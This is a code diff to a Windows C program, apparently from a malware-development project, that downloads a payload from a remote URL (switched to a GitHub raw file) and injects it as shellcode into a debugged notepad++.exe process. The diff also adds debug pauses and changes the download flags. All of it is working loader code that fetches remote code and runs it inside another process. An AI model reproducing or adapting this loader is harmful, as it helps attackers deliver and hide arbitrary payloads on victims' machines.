@@ -7,8 +7,9 @@ int main(void)
 	PBYTE	pPayload		= NULL;
 	SIZE_T	sPayloadSize	= 0;
 
-	if (!GetPayloadFromUrl(L"http://192.168.1.19:8000/payload.bin", &pPayload, &sPayloadSize)) { return -1; }
-	
+	if (!GetPayloadFromUrl(L"https://raw.githubusercontent.com/4dorable/Maldev/master/payload.bin", &pPayload, &sPayloadSize)) { return -1; }
+	printf("TEST1\n");
+	getchar();
 
 	// Create Suspended Process
 	DWORD  dwProcessID	= 0;
@@ -17,13 +18,16 @@ int main(void)
 
 	if (!CreateDebugProcess(L"C:\\Program Files\\Notepad++\\notepad++.exe", &dwProcessID, &hProcess, &hThread)) { return -1; }
 	
-
+	printf("TEST1\n");
+	getchar();
 	// Write Payload in Process
 	if (!InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, hThread)) { return -1; }
 	if (!DebugActiveProcessStop(dwProcessID)) {
 		printf("[!] DebugActiveProcessStop Failed With Error: %lu\n", GetLastError());
 		return -1;
 	};
+	printf("TEST1\n");
+	getchar();
 	if (pPayload)
 		LocalFree(pPayload);
 
@@ -60,7 +64,16 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 	}
 
 
-	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	hInternetFile = InternetOpenUrlW(
+		hInternet,
+		szUrl,
+		NULL,
+		0,
+		INTERNET_FLAG_SECURE |
+		INTERNET_FLAG_RELOAD |
+		INTERNET_FLAG_NO_CACHE_WRITE,
+		0
+	);
 	if (hInternetFile == NULL) {
 		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
